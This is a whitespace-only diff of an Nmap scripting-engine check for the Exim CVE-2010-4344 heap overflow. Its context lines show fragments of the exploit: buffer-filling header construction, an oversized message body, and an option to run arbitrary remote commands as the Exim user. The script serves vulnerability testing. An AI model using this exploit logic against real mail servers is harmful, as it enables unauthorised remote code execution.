@@ -29,7 +29,7 @@ run an arbitrary command on the remote system, under the
 <code>Exim</code> user privileges. If this script argument is set then it
 will enable the <code>smtp-vuln-cve2010-4344.exploit</code> argument.
 
-To get the appropriate debug messages for this script, please use -d2. 
+To get the appropriate debug messages for this script, please use -d2.
 
 Some of the logic of this script is based on the metasploit
 exim4_string_format exploit.
@@ -197,7 +197,7 @@ local function exploit_heap(socket, smtp_opts)
   log_buf_size = log_buf_size - 3
   local filler, hdrs, nmap_hdr = string.rep("X", 8 * 16), "", "NmapHeader"
 
-  while #log_buf < log_buf_size do 
+  while #log_buf < log_buf_size do
     local hdr = string.format("%s: %s\n", nmap_hdr, filler)
     local one = 2 + #hdr
     local two = 2 * one
@@ -208,7 +208,7 @@ local function exploit_heap(socket, smtp_opts)
       hdr = string.sub(hdr, 0, first - 1).."\n"
       hdrs = hdrs..hdr
       log_buf = log_buf.."  "..hdr
-      local second = left - first 
+      local second = left - first
       hdr = string.format("%s: %s\n", nmap_hdr, filler)
       hdr = string.sub(hdr, 0, second - 1).."\n"
     end
@@ -248,7 +248,7 @@ local function exploit_heap(socket, smtp_opts)
   if not status then
     return clean(socket, status, "failed to terminate headers.")
   end
- 
+
   local body_size = 0
   filler = string.rep(string.rep("Nmap", 63).."XX\r\n", 1024)
   while body_size < msg_len do
@@ -268,7 +268,7 @@ local function exploit_heap(socket, smtp_opts)
       return status, "failed to terminate the message."
     end
   end
- 
+
   status, ret = smtp.check_reply("DATA", response)
   if not status then
     local code = tonumber(ret:match("(%d+)"))
@@ -358,7 +358,7 @@ local function check_exim(smtp_opts)
     return smtp_finish(socket, false,
               'failed to read the SMTP banner.')
   end
-  
+
   if not smtp_opts.exploit then
     table.insert(out, 3, exim_heap_result)
     table.insert(out, 5, exim_priv_result)
@@ -395,7 +395,7 @@ local function check_exim(smtp_opts)
   if not smtp_opts.domain_ip then
     smtp_opts.domain_ip = nmap_scanme_ip
   end
- 
+
   -- set the appropriate 'MAIL FROM' and 'RCPT TO' values
   if not smtp_opts.mailfrom then
     smtp_opts.mailfrom = string.format("root@%s", smtp_opts.domain)
